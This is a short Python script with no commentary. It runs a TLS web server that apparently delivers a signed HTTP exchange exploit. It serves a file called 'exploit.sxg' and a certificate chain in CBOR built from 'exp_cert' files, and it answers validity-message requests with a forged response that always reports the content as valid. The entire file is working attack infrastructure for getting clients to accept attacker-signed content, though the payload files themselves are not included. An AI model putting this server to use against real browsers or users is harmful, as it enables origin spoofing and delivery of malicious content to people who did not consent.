import http.server
import ssl
import os
import sys

class BrokenCahllHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if '.sxg' in self.path:
            if not os.path.exists('exploit.sxg'):
                self.send_error(404)
                return
            with open('exploit.sxg', 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'application/signed-exchange;v=b3')
            self.send_header('X-Content-Type-Options', 'nosniff')
            self.send_header('Content-Length', str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        
        elif '.cbor' in self.path:
            if not os.path.exists('exp_cert.cbor'):
                self.send_error(404)
                return
            with open('exp_cert.cbor', 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'application/cert-chain+cbor')
            self.send_header('Content-Length', str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        elif 'resource.validity.msg' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            validity_json = b'{"validity": true, "expires": "2030-12-31T23:59:59Z"}'
            self.wfile.write(validity_json)
        
        else:
            print(self.path)
            self.send_error(404)
    
    def log_message(self, format, *args):
        print(f"{self.client_address[0]} - {self.command} {self.path}")

def main():
    if not os.path.exists('exp_cert.pem') or not os.path.exists('exp_cert.key'):
        print("Error: cert.crt or cert.key not found")
        sys.exit(1)
    
    if not os.path.exists('exploit.sxg'):
        print("Warning: exploit.sxg not found")
    if not os.path.exists('exp_cert.cbor'):
        print("Warning: exp_cert.cbor not found")
    
    host = '0.0.0.0'
    port = 443
    
    try:
        server = http.server.HTTPServer((host, port), BrokenCahllHandler)
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain('exp_cert.pem', 'exp_cert.key')
        server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
        
        print(f"Server running on https://{host}:{port}")
        
        server.serve_forever()
    
    except PermissionError:
        sys.exit(1)

if __name__ == '__main__':
        main()